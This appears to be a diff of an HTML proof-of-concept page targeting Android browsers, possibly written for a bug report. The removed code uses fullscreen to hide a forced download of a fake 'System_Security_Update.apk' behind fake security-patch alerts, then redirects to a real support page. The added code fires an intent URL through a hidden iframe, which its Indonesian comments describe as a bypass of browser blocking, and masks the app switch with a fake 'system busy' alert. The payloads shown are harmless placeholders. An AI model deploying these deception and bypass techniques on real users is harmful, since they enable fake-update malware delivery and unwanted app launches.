@@ -1,69 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>S Y S T E M</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURITY_RESEARCH_INTENT</title>
     <style>
         body, html { 
-            margin: 0; padding: 0; 
-            background: #000; color: #000; 
-            overflow: hidden; width: 100vw; height: 100vh;
-            touch-action: none; /* Disables zoom/scroll gestures */
+            margin: 0; padding: 0; background: #000; 
+            width: 100vw; height: 100vh;
         }
-        #jacker {
-            position: absolute; top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 9999; background: #000;
+        #trigger {
+            width: 100%; height: 100%; cursor: pointer;
         }
     </style>
 </head>
 <body>
-
-    <div id="jacker"></div>
+    <div id="trigger"></div>
 
 <script>
-    const jacker = document.getElementById('jacker');
+    const trigger = document.getElementById('trigger');
 
-    jacker.addEventListener('touchstart', function() {
-        // 1. Request Fullscreen
-        // On Android, this hides the status bar and navigation bar
-        const docElm = document.documentElement;
-        if (docElm.requestFullscreen) {
-            docElm.requestFullscreen();
-        } else if (docElm.webkitRequestFullscreen) {
-            docElm.webkitRequestFullscreen();
-        }
+    trigger.addEventListener('touchstart', function() {
+        // 1. Memaksa Fullscreen untuk mengacaukan fokus UI
+        document.documentElement.requestFullscreen();
 
-        // 2. TRIGGER DOWNLOAD
-        // Android Chrome usually shows a small "Downloading..." snackbar at the bottom.
-        // By triggering this EXACTLY as the screen expands to fullscreen,
-        // the snackbar is often pushed off-screen or covered by the black background layer.
-        const a = document.createElement('a');
-        a.href = "data:application/octet-stream;base64,Q01EIC9jIGNhbGMuZXhl";
-        a.download = "System_Security_Update.apk"; // APKs are more relevant for Android reports
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+        // 2. Konstruksi Intent yang berbahaya
+        // Contoh: Membuka dialer dengan nomor tertentu (Sangat umum untuk report bug)
+        // Atau bisa diganti dengan package lain: intent://#Intent;scheme=tel;...
+        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
 
-        // 3. Android-Specific Focus Hijack
-        // We use a shorter timeout because mobile users are more impatient.
+        // 3. Eksekusi Intent via Iframe (Teknik klasik untuk bypass)
+        // Beberapa versi Firefox Android gagal memblokir intent yang dipicu via iframe di mode fullscreen
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = intentUrl;
+        document.body.appendChild(iframe);
+
+        // 4. Cadangan: Direct Location Change
         setTimeout(() => {
-            
-            // On Android, alert() blocks the entire browser UI.
-            alert("SYSTEM ERROR: Security patch required.");
-            alert("Click OK to confirm installation.");
+            window.location.href = intentUrl;
+        }, 500);
 
-            // 4. THE GHOST EXIT & REDIRECT
-            if (document.exitFullscreen) {
-                document.exitFullscreen();
-            } else if (document.webkitExitFullscreen) {
-                document.webkitExitFullscreen();
-            }
-
-            // Redirect to a legitimate-looking mobile support page
-            window.location.replace("https://support.google.com/android/?hl=id");
-
-        }, 4000); 
+        // 5. Lockdown visual agar user tidak sadar aplikasi berpindah
+        setTimeout(() => {
+            alert("SISTEM SIBUK: Memproses permintaan keamanan...");
+        }, 1000);
     });
 </script>
 </body>
